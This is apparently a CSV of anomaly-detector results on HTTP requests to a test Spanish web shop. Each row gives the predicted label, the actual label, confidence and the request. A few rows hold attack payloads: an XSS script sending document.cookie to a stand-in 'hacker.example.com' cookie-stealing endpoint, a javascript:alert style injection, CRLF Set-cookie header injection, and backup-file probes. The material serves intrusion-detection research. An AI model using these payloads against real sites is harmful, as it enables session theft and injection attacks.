Predicted,Actual,Confidence,Method,Content,URL
0,Normal,50.27%,GET,,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=peiser&password=9iri7aza&nombre=Nevel&apellidos=Domenge+Canelas&email=kirland-lincovsky%40la-sexta-f1.fo&dni=48549953N&direccion=Rio+Jarama+194+6-H&ciudad=Valverdejo&cp=20150&provincia=Toledo&ntc=9766800722499068&B1=Registrar HTTP/1.1
1,Anomalous,56.50%,GET,,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=8659&B1=Pasar+por+caja HTTP/1.1
1,Anomalous,62.11%,GET,,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6840&B1=Pasar+por+caja%2F HTTP/1.1
1,Anomalous,57.14%,POST,B2A=Vaciar+carrito,http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
1,Anomalous,50.70%,GET,,http://localhost:8080/tienda1/global.OLD HTTP/1.1
1,Anomalous,58.80%,POST,errorMsg=Credenciales+incorrectas%4040,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
1,Anomalous,66.37%,GET,,http://localhost:8080/busytime.nsf HTTP/1.1
1,Anomalous,56.50%,GET,,http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=4828&B1=Confirmar HTTP/1.1
1,Anomalous,66.37%,GET,,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=roig&password=a4ev1l19&nombre=Ra%FAl&apellidos=Esterric+Bou&email=munshin%40cirugiaplasticacordoba.hk&dni=42473286Z&direccion=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&ciudad=Alcaraz&cp=40291&provincia=Huesca&ntc=4538972829961563&B1=Registrar HTTP/1.1
0,Normal,60.76%,GET,,http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1
1,Anomalous,56.50%,GET,,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=1136&B1=Pasar+por+caja HTTP/1.1
0,Normal,60.76%,POST,id=2,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
0,Anomalous,53.33%,POST,modo=entrar&login=cheng&pwd=cazc%2Calear&remember=off&B1=Entrar,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
0,Normal,59.97%,GET,,http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1
1,Anomalous,62.11%,GET,,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9043&B1=Pasar+por+caja%2F HTTP/1.1
0,Normal,58.66%,GET,,http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
0,Normal,64.25%,GET,,http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1
1,Anomalous,54.36%,POST,modo=registro&login=mitsuiparos%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&password=d2S3O1nil2ar&nombre=Tea&apellidos=Cabrera+Noguera&email=holzer-hammersley4%40discon.in&dni=21034297S&direccion=Guadamacil%2C+198%2C+&ciudad=Torrejoncillo&cp=08779&provincia=Teruel&ntc=4706372444418662&B1=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
0,Normal,60.76%,GET,,http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1
1,Anomalous,51.56%,POST,modo=registro&login=perrotta4&password=-fortificaci%F3n&nombreA=Temistocles&apellidos=Bastidas+Lacruz&email=butch%407horas.coop&dni=64652659G&direccion=Calle+Cristo+86%2C+2G&ciudad=Berrocalejo+de+Aragona&cp=10520&provincia=Girona&ntc=8239878600110127&B1=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
0,Normal,51.85%,POST,modo=registro&login=raab&password=ac6%EDdi9o&nombre=Thal%EDa&apellidos=Albornoz+Quiva&email=heldabrand5%40chevrolet-volt.bg&dni=11738063J&direccion=C%2F+Otumba%2C+132%2C+&ciudad=Carataunas&cp=43791&provincia=Cuenca&ntc=8400067402160298&B1=Registrar,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
1,Anomalous,59.29%,GET,,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=libbey&pwd=141c1U01&remember=on&B1A=Entrar HTTP/1.1
1,Anomalous,54.74%,POST,modo=entrar&login=raymund&pwd=pist%F3n&remember=on&B1=%253F,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
0,Normal,60.76%,GET,,http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1
0,Normal,58.66%,GET,,http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1
1,Anomalous,59.95%,GET,,http://localhost:8080/tienda1/6909030637832563290.jsp.Old HTTP/1.1
1,Anomalous,58.86%,POST,id=3%2F&nombre=Vino+Rioja&precio=39&cantidad=90&B1=A%F1adir+al+carrito,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
1,Anomalous,51.56%,POST,errorMsgA=Credenciales+incorrectas,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
1,Anomalous,53.67%,POST,idA=1,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
0,Normal,51.85%,GET,,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hocutt&password=MonTE9A&nombre=Sibila&apellidos=Garcez+Iturriria&email=neugebauer%40buscamoto.gw&dni=37246742J&direccion=Galeno+106%2C+9%3FC&ciudad=Ciadoncha&cp=17744&provincia=Segovia&ntc=8444341614355746&B1=Registrar HTTP/1.1
1,Anomalous,56.50%,GET,,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertarany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&precio=7931&B1=Confirmar HTTP/1.1
1,Anomalous,66.37%,GET,,http://localhost:8080/asf-logo-wide.gif HTTP/1.1
0,Normal,58.79%,GET,,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1
1,Normal,51.65%,GET,,http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=28&B1=A%F1adir+al+carrito HTTP/1.1
1,Anomalous,61.00%,GET,,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%7C HTTP/1.1
1,Anomalous,61.00%,POST,errorMsg=%2500,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
1,Anomalous,54.36%,POST,modo=registro&login=ca%2Bri%2Bta&password=import%21ador&nombre=Leinad&apellidos=Alabart&email=koyama%40civicosdns.jp&dni=19113499Q&direccion=C%2F+Silvinita+95%2C+11D&ciudad=Cordobilla+de+L%E1cara&cp=16800&provincia=Cuenca&ntc=9775185207171671&B1=Registrar,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
0,Normal,58.79%,GET,,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1
0,Normal,60.76%,GET,,http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1
